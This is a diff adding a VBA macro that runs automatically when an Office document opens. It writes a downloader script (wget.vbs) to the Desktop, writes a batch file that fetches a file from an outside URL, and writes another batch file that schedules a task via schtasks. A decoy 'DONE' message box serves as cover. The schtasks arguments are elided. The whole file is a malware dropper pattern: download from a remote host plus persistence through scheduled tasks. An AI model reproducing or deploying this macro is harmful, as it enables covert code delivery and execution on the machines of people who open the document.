@@ -1,0 +1,101 @@
+Sub AutoOpen()
+
+    worker
+    coverture
+    
+End Sub
+
+Sub coverture()
+    
+    MsgBox "DONE"
+    
+End Sub
+
+
+Sub worker()
+
+    Dim directory As String
+    Dim url As String
+    Dim agent_name As String
+    
+    directory = "C:\Users\user\Desktop\"
+    url = "http://www.redorbit.com/media/uploads/2015/09/test_2.png"
+    agent_name = "test.png"
+    
+    
+    ChDir directory
+    
+    
+'--------------------------------------------------------------------------------
+' Building wget, use it: wget <url> <output_file>
+
+    Dim fso1 As Object
+    Set fso1 = CreateObject("Scripting.FileSystemObject")
+    Dim oFile1 As Object
+    Set oFile1 = fso1.CreateTextFile("wget.vbs")
+
+    oFile1.WriteLine "strUrl = WScript.Arguments.Item(0)"
+    oFile1.WriteLine "StrFile = WScript.Arguments.Item(1)"
+    oFile1.WriteLine "Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0"
+    oFile1.WriteLine "Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0"
+    oFile1.WriteLine "Const HTTPREQUEST_PROXYSETTING_DIRECT = 1"
+    oFile1.WriteLine "Const HTTPREQUEST_PROXYSETTING_PROXY = 2"
+    oFile1.WriteLine "Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts"
+    oFile1.WriteLine "Err.Clear"
+    oFile1.WriteLine "Set http = Nothing"
+    oFile1.WriteLine "Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"")"
+    oFile1.WriteLine "If http Is Nothing Then Set http = CreateObject(""WinHttp.WinHttpRequest"")"
+    oFile1.WriteLine "If http Is Nothing Then Set http = CreateObject(""MSXML2.ServerXMLHTTP"")"
+    oFile1.WriteLine "If http Is Nothing Then Set http = CreateObject(""Microsoft.XMLHTTP"")"
+    oFile1.WriteLine "http.Open ""GET"", strURL, False"
+    oFile1.WriteLine "http.Send"
+    oFile1.WriteLine "varByteArray = http.ResponseBody"
+    oFile1.WriteLine "Set http = Nothing"
+    oFile1.WriteLine "Set fs = CreateObject(""Scripting.FileSystemObject"")"
+    oFile1.WriteLine "Set ts = fs.CreateTextFile(StrFile, True)"
+    oFile1.WriteLine "strData = """""
+    oFile1.WriteLine "strBuffer = """""
+    oFile1.WriteLine "For lngCounter = 0 to UBound(varByteArray)"
+    oFile1.WriteLine "ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))"
+    oFile1.WriteLine "Next"
+    oFile1.WriteLine "ts.Close"
+
+    oFile1.Close
+    Set fso1 = Nothing
+    Set oFile1 = Nothing
+
+'--------------------------------------------------------------------------------
+' Writing scheduled_bat script
+
+    Dim fso2 As Object
+    Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Dim oFile2 As Object
+    Set oFile2 = fso2.CreateTextFile("scheduled.bat")
+
+    oFile2.WriteLine directory & "wget.vbs " & url & " " & agent_name
+
+    oFile2.Close
+    Set fso2 = Nothing
+    Set oFile2 = Nothing
+    
+
+'--------------------------------------------------------------------------------
+' Writing to_exec_bat script
+
+    Dim fso3 As Object
+    Set fso3 = CreateObject("Scripting.FileSystemObject")
+    Dim oFile3 As Object
+    Set oFile3 = fso3.CreateTextFile("toexec.bat")
+
+    oFile3.WriteLine "set minute=%time:~3,2%"
+    oFile3.WriteLine "set /A minute+=2"
+    oFile3.WriteLine "set tasktime=%time:~0,2%:%minute%:%time:~6,2%"
+     
+    oFile3.WriteLine "schtasks /create ... /ST %tasktime%"
+    
+    oFile3.Close
+    Set fso3 = Nothing
+    Set oFile3 = Nothing
+
+
+End Sub
